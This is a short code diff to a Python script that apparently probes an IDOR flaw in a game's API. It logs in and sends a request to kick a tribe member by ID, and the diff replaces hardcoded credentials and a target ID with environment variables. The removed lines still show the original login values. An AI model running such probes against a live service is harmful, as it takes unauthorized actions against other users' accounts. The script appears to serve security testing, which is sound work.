@@ -6,12 +6,12 @@ from fruitcraft_client import FruitClient
 
 def main():
     c1 = FruitClient()
-    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
+    s1, d1 = c1.login(os.environ.get("TEST_ACC_1_KEY", "REDACTED_KEY_1"), os.environ.get("TEST_ACC_1_UDID", "REDACTED_UDID_1"))
     if not s1: return
     
     print("Testing Tribe Kick IDOR...")
     
-    res = c1.post("/tribe/kick", {"tribe_id": 1, "member_id": 9561877})
+    res = c1.post("/tribe/kick", {"tribe_id": 1, "member_id": int(os.environ.get("TEST_ACC_2_ID", "9999999"))})
     print("Kick response:", res)
 
 if __name__ == "__main__":
